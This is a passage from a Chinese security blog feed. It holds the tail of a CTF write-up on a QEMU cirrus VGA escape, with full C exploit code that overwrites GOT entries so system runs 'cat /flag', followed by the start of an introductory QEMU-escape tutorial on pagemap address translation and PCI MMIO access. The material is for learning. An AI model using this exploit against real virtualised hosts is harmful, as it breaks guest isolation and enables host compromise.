class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> vga_addr = <span class="number">0xa0000</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> vga_size = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *vga_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_sr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(idx, <span class="number">0x3c4</span>);</span><br><span class="line">    outb(val, <span class="number">0x3c5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vga_mem_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint8_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint8_t</span> *)(vga_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_latch</span><span class="params">(<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    a = vga_mem[(value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>]; <span class="comment">// write hight</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    a = vga_mem[value &amp; <span class="number">0xffff</span>]; <span class="comment">// write low</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vga_mem = mmap(<span class="literal">NULL</span>, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);</span><br><span class="line">    <span class="keyword">if</span> (!vga_mem)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(<span class="number">0x3b0</span>, <span class="number">0x30</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;cannot ioperm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">7</span>, <span class="number">1</span>);       <span class="comment">// bypass first if</span></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">4</span>);    <span class="comment">// v7==4</span></span><br><span class="line">    set_sr(<span class="number">0xcd</span>, <span class="number">0x10</span>); <span class="comment">// vs[0x10]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> bss = <span class="number">0x109e000</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_logfile = <span class="number">0x10CCBE0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> vfprintf_got = <span class="number">0xee7bb0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> system_plt = <span class="number">0x409dd0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> printf_chk_got = <span class="number">0xee7028</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_log = <span class="number">0x9726E8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cat_flag[] = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> cur_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a = vga_mem[<span class="number">1</span>];</span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    set_latch(bss);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;cat_flag[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, cat_flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(qemu_logfile - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;bss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(vfprintf_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;system_plt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(printf_chk_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;qemu_log;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">2</span>);</span><br><span class="line">    vga_mem_write(<span class="number">0x18100</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315163823703.png"                      alt="image-20230315163823703"                ></p><hr><p>参考链接:<br>  <a class="link"   href="https://www.anquanke.com/post/id/224199#h3-11" >https://www.anquanke.com/post/id/224199#h3-11<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://devcraft.io/2018/11/22/q-escape-seccon-2018.html" >https://devcraft.io/2018/11/22/q-escape-seccon-2018.html<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>  <a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip" >https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;许久没有更新，前段时间一直考试所以一直拖着了。&lt;/p&gt;
&lt;h2 id=&quot;设备分析&quot;&gt;&lt;a href=&quot;#设备分析&quot; class=&quot;headerlink&quot; title=&quot;设备分析&quot;&gt;&lt;/a&gt;设备分析&lt;/h2&gt;&lt;p&gt;首先看看开了什么保护&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
    <category term="vga" scheme="https://cv196082.gitee.io/tags/vga/"/>
    
  </entry>
  
  <entry>
    <title>qemu逃逸入门</title>
    <link href="https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2023-02-05T09:39:57.000Z</published>
    <updated>2023-03-21T07:58:23.390Z</updated>
    
    <content type="html"><![CDATA[<p>首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。</p><p>在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。</p><h2 id="qemu的内存结构"><a href="#qemu的内存结构" class="headerlink" title="qemu的内存结构"></a>qemu的内存结构</h2><p>qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。</p><h3 id="qemu的地址转化"><a href="#qemu的地址转化" class="headerlink" title="qemu的地址转化"></a>qemu的地址转化</h3><p>用户虚拟地址-&gt;用户物理地址</p><p>用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。</p><p>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。</p><ul><li>  Bits 0-54 page frame number (PFN) if present</li><li>  Bits 0-4 swap type if swapped</li><li>  Bits 5-54 swap offset if swapped</li><li>  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</li><li>  Bit 56 page exclusively mapped (since 4.2)</li><li>  Bits 57-60 zero</li><li>  Bit 61 page is file-page or shared-anon (since 3.5)</li><li>  Bit 62 page swapped</li><li>  Bit 63 page present</li></ul><p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p><p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p><p>2、 读取长度为<code>64bits</code>的数据项</p><p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p><p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p><p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p><p>对应代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *userbuf;</span><br><span class="line">    <span class="keyword">uint64_t</span> userbuf_pa;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem:\t%p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap userbuf&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(usebuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    userbuf_pa = va2pa(userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_va:\t%p\n&quot;</span>,userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_pa:\t%p\n&quot;</span>,(<span class="keyword">void</span> *)userbuf_pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。</p><h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p>而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t01a97028b7de9d6955.png"                      alt="t01a97028b7de9d6955"                ></p><ul><li>  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li><li>  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li><li>  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li><li>  Bits 31-4：Base Address，以 16 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/mmio_mem.png"                      alt="mmio_mem"                ></p><p><strong>在用户态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在内核态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 